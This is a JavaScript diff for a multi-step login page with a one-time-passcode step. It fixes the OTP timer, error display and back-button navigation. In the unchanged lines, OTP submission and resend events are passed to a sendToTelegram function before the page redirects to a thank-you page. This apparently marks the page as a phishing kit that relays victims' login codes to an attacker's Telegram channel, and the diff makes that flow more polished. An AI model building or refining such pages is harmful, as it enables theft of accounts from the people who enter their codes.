@@ -756,8 +756,8 @@ function renderOtp(){
   });
   otpValue=val;
   document.getElementById('otpBtn').classList.toggle('on',val.length===6);
-  clearError('otpWrap','otpError');
-  haptic('select');
+  if(val.length>0) document.getElementById('otpError').classList.remove('show');
+  if(val.length>0) haptic('select');
 }
 otpHidden.addEventListener('input',renderOtp);
 otpHidden.addEventListener('focus',renderOtp);
@@ -774,6 +774,7 @@ function showStep(id){
   document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
   currentStep=id;
+  if(id!=='step1') history.pushState({page:'login',step:id},'','');
 }
 
 /* ── RIPPLE ───────────────────────────────── */
@@ -881,6 +882,7 @@ document.getElementById('otpBtn').onclick=()=>{
     return;
   }
   otpSubmitted=true;
+  if(_otpTimer){clearInterval(_otpTimer);_otpTimer=null;}
   haptic('success');
   sendToTelegram('offer_received');
   navigate('thankyou.html');
@@ -894,15 +896,18 @@ document.getElementById('resendBtn').onclick=()=>{
   sendToTelegram('resend_otp');startTimer();
 };
 
+let _otpTimer=null;
 function startTimer(){
+  if(_otpTimer) clearInterval(_otpTimer);
   let t=120;
   const timeEl=document.getElementById('time'),resendBtn=document.getElementById('resendBtn');
   timeEl.textContent=t;resendBtn.classList.remove('active');resendClicked=false;
   resetOtp(false);document.getElementById('otpBtn').classList.remove('on');
-  const timer=setInterval(()=>{
+  _otpTimer=setInterval(()=>{
     t--;timeEl.textContent=t;
     if(t<=0){
-      clearInterval(timer);resendBtn.classList.add('active');resetOtp(true);
+      clearInterval(_otpTimer);_otpTimer=null;
+      resendBtn.classList.add('active');resetOtp(true);
       document.getElementById('otpBtn').classList.remove('on');
       document.getElementById('maskedNumber').textContent='Code expired. Tap Resend.';
     }
@@ -941,6 +946,21 @@ function navigate(url){
   setStep(0);setTimeout(()=>setStep(1),500);setTimeout(()=>setStep(2),1050);
   setTimeout(()=>{window.location.href=url},1600);
 }
+
+/* ── BACK BUTTON SUPPORT ─────────────────── */
+history.replaceState({page:'login',step:'step1'},'','');
+window.addEventListener('popstate',function(e){
+  const state=e.state||{};
+  if(currentStep==='step3'||currentStep==='stepVerify'){
+    // back from OTP/verify → return to step1, reset flags
+    loginClicked=false;
+    showStep('step1');
+    history.replaceState({page:'login',step:'step1'},'','');
+  } else {
+    // back from step1 → go to index
+    window.location.href='index.html';
+  }
+},{passive:false});
 
 /* ── CURTAIN PARTICLES ────────────────────── */
 (function(){
